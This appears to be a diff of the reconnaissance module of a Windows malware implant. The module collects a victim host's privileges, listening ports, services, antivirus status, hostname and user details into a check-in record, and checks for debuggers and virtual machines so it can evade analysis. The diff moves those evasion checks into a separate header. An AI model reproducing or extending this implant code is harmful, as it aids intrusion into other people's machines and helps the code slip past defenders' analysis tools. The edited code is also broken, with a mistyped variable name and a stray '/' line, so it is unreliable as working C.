@@ -5,7 +5,7 @@
 #include <iphlpapi.h>
 #include <lm.h>
 #include <stdio.h>
-#include <intrin.h>
+#include "anti_analysis.h"
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
@@ -31,29 +31,24 @@ static VOID collect_privilege(OUT CHAR* buf, DWORD size) {
 }
 
 // -- Port scan (top 20 common ports) ----------------------------------
-static DWORD g_common_ports[] = {
-    21,22,23,25,53,80,110,135,139,143,
-    443,445,3389,8080,8443,1433,3306,5432,6379,27017
-};
+static VOID collect_open_ports (OUT PCHECKIN_INFO pInfo){
+    pINfo -> port_count =0;
+    DWORD dwSize =0;
+    GetExtendedTcpTable(NULL,&dwSize,FALSE,AF_INET, TCP_TABLE_BASIC_LISTENER,0);
+    PMIB_TCPTABLE pTable =
+        (PMIB_TCPTABLE)HeapAlloc(GetProcessHeap(), 0, dwSize);
+    if (!pTable)
+      return;
 
-static VOID collect_open_ports(OUT PCHECKIN_INFO pInfo) {
-    WSADATA wsa = {0};
-    WSAStartup(MAKEWORD(2,2), &wsa);
-    pInfo->port_count = 0;
-    for (int i = 0; i < 20 && pInfo->port_count < MAX_PORTS; i++) {
-        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
-        DWORD timeout = 300; // 300ms
-        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO,
-                   (char*)&timeout, sizeof(timeout));
-        struct sockaddr_in addr = {0};
-        addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
-        addr.sin_port = htons((u_short)g_common_ports[i]);
-        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0)
-            pInfo->open_ports[pInfo->port_count++] = g_common_ports[i];
-        closesocket(s);
+    if (GetExtendedTcpTable(pTable, &dwSize, FALSE, AF_INET,
+                            TCP_TABLE_BASIC_LISTENER, 0) == NO_ERROR) {
+      for (DWORD i = 0;
+           i < pTable->dwNumEntries && pInfo->port_count < MAX_PORTS; i++) {
+        DWORD port = ntohs((u_short)pTable->table[i].dwLocalPort);
+        pInfo->open_ports[pInfo->port_count++] = port;
+      }
     }
-    WSACleanup();
+    HeapFree(GetProcessHeap(), 0, pTable);
 }
 
 // -- Running services via EnumServicesStatus --------------------------
@@ -105,22 +100,7 @@ static BOOL collect_av_running() {
     return FALSE;
 }
 
-// -- Mod 71: anti-debug check ----------------------------------------
-static BOOL collect_is_debugged() {
-    if (IsDebuggerPresent()) return TRUE;
-    BOOL remote = FALSE;
-    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
-    return remote;
-}
-
-// -- Mod 73: VM/sandbox check ----------------------------------------
-static BOOL collect_is_vm() {
-    int cpuInfo[4] = {0};
-    __cpuid(cpuInfo, 1);
-    if (cpuInfo[2] & (1 << 31)) return TRUE;
-    if (GetTickCount64() < 300000ULL) return TRUE;
-    return FALSE;
-}
+/
 
 // -- Hostname, username, arch, IP -------------------------------------
 static VOID collect_hostname(OUT CHAR* buf, DWORD size) {
@@ -172,8 +152,8 @@ BOOL recon_collect(OUT PCHECKIN_INFO pInfo) {
     collect_services(pInfo);
     pInfo->domain_joined     = collect_domain_joined();
     pInfo->antivirus_running = collect_av_running();
-    pInfo->is_debugged       = collect_is_debugged();
-    pInfo->is_vm             = collect_is_vm();
+    pInfo->is_debugged = anti_debug_check();
+    pInfo->is_vm = anti_vm_check();
     collect_hostname(pInfo->hostname, sizeof(pInfo->hostname));
     collect_username(pInfo->username, sizeof(pInfo->username));
     collect_os_version(pInfo->os_version, sizeof(pInfo->os_version));
